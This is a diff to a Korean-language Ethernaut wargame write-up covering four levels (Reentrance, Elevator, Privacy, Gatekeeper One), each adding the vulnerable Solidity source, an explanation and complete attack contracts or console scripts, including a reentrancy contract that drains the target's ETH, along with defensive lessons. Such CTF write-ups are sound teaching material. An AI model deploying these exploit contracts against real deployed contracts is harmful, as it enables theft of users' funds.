@@ -925,7 +925,7 @@ await contract._king()
 
 ### 문제 요약
 
-작성 예정.
+컨트랙트의 ETH 잔액을 0으로 만들면 클리어된다. 출금 함수가 잔액을 차감하기 전에 외부 호출을 먼저 해서 재진입이 가능하다.
 
 ### 핵심
 
@@ -933,19 +933,124 @@ await contract._king()
 - Checks-Effects-Interactions
 - 출금 로직 순서
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Reentrance {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) public balances;
+
+    function donate(address _to) public payable {
+        balances[_to] = balances[_to].add(msg.value);
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool result,) = msg.sender.call{value: _amount}("");
+            if (result) {
+                _amount;
+            }
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+```
+
 ### 풀이
 
-작성 예정.
+취약점은 `withdraw()`의 순서다.
+
+```solidity
+(bool result,) = msg.sender.call{value: _amount}("");
+balances[msg.sender] -= _amount;
+```
+
+컨트랙트가 ETH를 먼저 보내고, 그 다음에 잔액을 차감한다.
+
+공격 컨트랙트가 ETH를 받으면 `receive()`가 실행된다. 이 안에서 다시 `withdraw()`를 호출하면 아직 `balances[msg.sender]`가 줄어들기 전이라 같은 금액을 또 출금할 수 있다.
+
+흐름은 다음과 같다.
+
+1. 공격 컨트랙트가 `donate()`로 잔액을 만든다.
+2. `withdraw()`를 호출한다.
+3. ETH를 받는 순간 공격 컨트랙트의 `receive()`가 실행된다.
+4. 대상 컨트랙트 잔액이 남아 있으면 다시 `withdraw()`를 호출한다.
+5. 반복해서 대상 컨트랙트 잔액을 비운다.
 
 ### 공격 코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint256 _amount) external;
+}
+
+contract ReentranceAttack {
+    IReentrance private immutable target;
+
+    constructor(address targetAddress) {
+        target = IReentrance(targetAddress);
+    }
+
+    function attack() external payable {
+        require(msg.value > 0, "value required");
+
+        target.donate{value: msg.value}(address(this));
+        target.withdraw(msg.value);
+    }
+
+    receive() external payable {
+        uint256 targetBalance = address(target).balance;
+
+        if (targetBalance > 0) {
+            uint256 withdrawAmount = targetBalance < msg.value
+                ? targetBalance
+                : msg.value;
+
+            target.withdraw(withdrawAmount);
+        }
+    }
+}
 ```
+
+Remix에서 `ReentranceAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.
+
+```javascript
+contract.address
+```
+
+배포 후 `attack()`을 실행할 때 `Value`에 소액 ETH를 넣는다. 대상 잔액보다 크지 않은 값이면 된다.
+
+대상 잔액 확인:
+
+```javascript
+await getBalance(contract.address)
+```
+
+공격 후 잔액이 `0`이면 인스턴스를 제출한다.
 
 ### 정리
 
-작성 예정.
+외부 호출 전에 상태를 먼저 변경해야 한다. `withdraw()`는 잔액 차감 후 ETH 전송을 해야 하며
+
+재진입 방지를 위해 Checks-Effects-Interactions 패턴이나 reentrancy guard를 사용해야 한다.
+
+컨퍼런스 리뷰에서 나왔던 `reentrancy` 재진입 공격이다. 
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Elevator" markdown="1">
@@ -954,7 +1059,9 @@ await contract._king()
 
 ### 문제 요약
 
-작성 예정.
+엘리베이터를 최상층에 도달한 상태로 만들면 클리어된다. 
+
+대상 컨트랙트는 호출자를 `Building` 인터페이스로 믿고 `isLastFloor()` 결과를 그대로 사용한다.
 
 ### 핵심
 
@@ -962,19 +1069,104 @@ await contract._king()
 - 상태 변화 기반 응답
 - 외부 컨트랙트 호출
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+`goTo()`는 `msg.sender`를 `Building`으로 캐스팅한다.
+
+```solidity
+Building building = Building(msg.sender);
+```
+
+즉 일반 지갑으로 직접 호출하는 것이 아니라, `isLastFloor()`를 구현한 공격 컨트랙트에서 호출해야 한다.
+
+핵심은 `isLastFloor()`가 두 번 호출된다는 점이다.
+
+```solidity
+if (!building.isLastFloor(_floor)) {
+    floor = _floor;
+    top = building.isLastFloor(floor);
+}
+```
+
+첫 번째 호출은 `false`를 반환해야 `if` 안으로 들어간다. 두 번째 호출은 `true`를 반환해야 `top`이 `true`가 된다.
+
+그래서 공격 컨트랙트 내부 상태를 바꿔 호출마다 다른 값을 반환하게 만든다.
 
 ### 공격 코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint256 _floor) external;
+}
+
+contract ElevatorAttack {
+    IElevator private immutable target;
+    bool private called;
+
+    constructor(address targetAddress) {
+        target = IElevator(targetAddress);
+    }
+
+    function attack() external {
+        target.goTo(1);
+    }
+
+    function isLastFloor(uint256) external returns (bool) {
+        if (!called) {
+            called = true;
+            return false;
+        }
+
+        return true;
+    }
+}
 ```
+
+Remix에서 `ElevatorAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.
+
+```javascript
+contract.address
+```
+
+배포 후 `attack()`을 실행하고 확인한다.
+
+```javascript
+await contract.top()
+```
+
+`true`가 나오면 인스턴스를 제출하면 된다.
 
 ### 정리
 
-작성 예정.
+외부 컨트랙트의 반환값을 신뢰하면 안 된다. 같은 함수라도 호출 시점과 내부 상태에 따라 다른 값을 반환할 수 있다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Privacy" markdown="1">
@@ -983,7 +1175,7 @@ await contract._king()
 
 ### 문제 요약
 
-작성 예정.
+`locked`를 `false`로 만들면 클리어된다. `private` 배열에 들어 있는 `data[2]`를 스토리지에서 읽고, 앞 16바이트만 잘라 키로 사용한다.
 
 ### 핵심
 
@@ -991,19 +1183,85 @@ await contract._king()
 - packing
 - bytes 캐스팅
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+    bool public locked = true;
+    uint256 public ID = block.timestamp;
+    uint8 private flattening = 10;
+    uint8 private denomination = 255;
+    uint16 private awkwardness = uint16(block.timestamp);
+    bytes32[3] private data;
+
+    constructor(bytes32[3] memory _data) {
+        data = _data;
+    }
+
+    function unlock(bytes16 _key) public {
+        require(_key == bytes16(data[2]));
+        locked = false;
+    }
+
+    /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+    */
+}
+```
+
 ### 풀이
 
-작성 예정.
+`unlock()`은 `bytes16(data[2])`와 입력값을 비교한다.
+
+```solidity
+require(_key == bytes16(data[2]));
+```
+
+`data`는 `private`이지만 스토리지에서 직접 읽을 수 있다. 먼저 슬롯 배치를 계산한다.
+
+- slot 0: `locked`
+- slot 1: `ID`
+- slot 2: `flattening`, `denomination`, `awkwardness` packing
+- slot 3: `data[0]`
+- slot 4: `data[1]`
+- slot 5: `data[2]`
+
+따라서 slot 5를 읽으면 `data[2]`가 나온다.
+
+```javascript
+await web3.eth.getStorageAt(contract.address, 5)
+```
+
+`unlock()`은 `bytes16`을 받으므로 `bytes32` 전체가 아니라 앞 16바이트만 넘겨야 한다. 16바이트는 hex 문자 32개이고, 앞의 `0x`까지 포함하면 `slice(0, 34)`다.
 
 ### 공격 코드
 
 ```javascript
-// 작성 예정
+const data = await web3.eth.getStorageAt(contract.address, 5);
+const key = data.slice(0, 34);
+
+await contract.unlock(key);
+
+await contract.locked();
 ```
+
+- `getStorageAt(contract.address, 5)`: `data[2]`가 저장된 slot 5를 읽는다.
+- `slice(0, 34)`: `0x`와 앞 16바이트만 남긴다.
+- `unlock(key)`: 잘라낸 값을 키로 넘긴다.
+- `locked()`: `false`가 나오면 성공이다.
 
 ### 정리
 
-작성 예정.
+`private`은 데이터를 숨기지 않는다. 또한 Solidity 스토리지 레이아웃과 packing 규칙을 알면 private 배열 값도 직접 찾아 읽을 수 있다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Gatekeeper One" markdown="1">
@@ -1012,7 +1270,7 @@ await contract._king()
 
 ### 문제 요약
 
-작성 예정.
+세 개의 gate를 통과해 `entrant`를 내 주소로 만들면 클리어된다. 직접 호출은 막혀 있고, gas 조건과 `bytes8` 조건을 맞춰야 한다.
 
 ### 핵심
 
@@ -1020,19 +1278,130 @@ await contract._king()
 - gas 조절
 - bytes 변환 조건
 
+### 소스 코드
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+
 ### 풀이
 
-작성 예정.
+`gateOne`은 직접 호출을 막는다.
+
+```solidity
+require(msg.sender != tx.origin);
+```
+
+EOA가 공격 컨트랙트를 호출하고, 공격 컨트랙트가 `enter()`를 호출하면 조건이 통과된다.
+
+- `tx.origin`: 내 지갑 주소
+- `msg.sender`: 공격 컨트랙트 주소
+
+`gateTwo`는 남은 gas가 `8191`로 나누어떨어져야 한다.
+
+```solidity
+require(gasleft() % 8191 == 0);
+```
+
+정확한 gas는 컴파일러와 실행 경로에 따라 달라질 수 있으므로 공격 컨트랙트에서 `0`부터 `8190`까지 offset을 brute force한다.
+
+`gateThree`는 `_gateKey`의 비트 조건을 맞추는 문제다.
+
+```solidity
+require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
+require(uint32(uint64(_gateKey)) != uint64(_gateKey));
+require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
+```
+
+조건을 만족하려면 다음 형태가 필요하다.
+
+- 하위 16비트: `tx.origin`의 하위 16비트와 같아야 한다.
+- 중간 16비트: `0`이어야 한다.
+- 상위 32비트: `0`이 아니어야 한다.
+
+그래서 `tx.origin`을 `uint64`로 줄인 뒤 `0xFFFFFFFF0000FFFF`로 마스킹한다.
 
 ### 공격 코드
 
 ```solidity
-// 작성 예정
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperOne {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract GatekeeperOneAttack {
+    IGatekeeperOne private immutable target;
+
+    constructor(address targetAddress) {
+        target = IGatekeeperOne(targetAddress);
+    }
+
+    function attack() external {
+        uint64 key = uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF;
+
+        for (uint256 i = 0; i < 8191; i++) {
+            (bool success,) = address(target).call{gas: 8191 * 3 + i}(
+                abi.encodeWithSignature("enter(bytes8)", bytes8(key))
+            );
+
+            if (success) {
+                return;
+            }
+        }
+
+        revert("gate failed");
+    }
+}
 ```
+
+Remix에서 `GatekeeperOneAttack`을 배포할 때 `targetAddress`에는 Ethernaut 인스턴스 주소를 넣는다.
+
+```javascript
+contract.address
+```
+
+배포 후 `attack()`을 실행하고 확인한다.
+
+```javascript
+await contract.entrant()
+```
+
+내 지갑 주소가 나오면 인스턴스를 제출하면 된다.
 
 ### 정리
 
-작성 예정.
+modifier도 결국 조건문이다. 호출 주체, gas, 타입 캐스팅 규칙을 각각 맞추면 우회할 수 있다. 
+
+특히 작은 정수 타입으로 잘라 비교하는 로직은 비트 단위로 계산해야 한다.
 
 </section>
 <section class="ethernaut-page" data-ethernaut-page data-level-title="Gatekeeper Two" markdown="1">
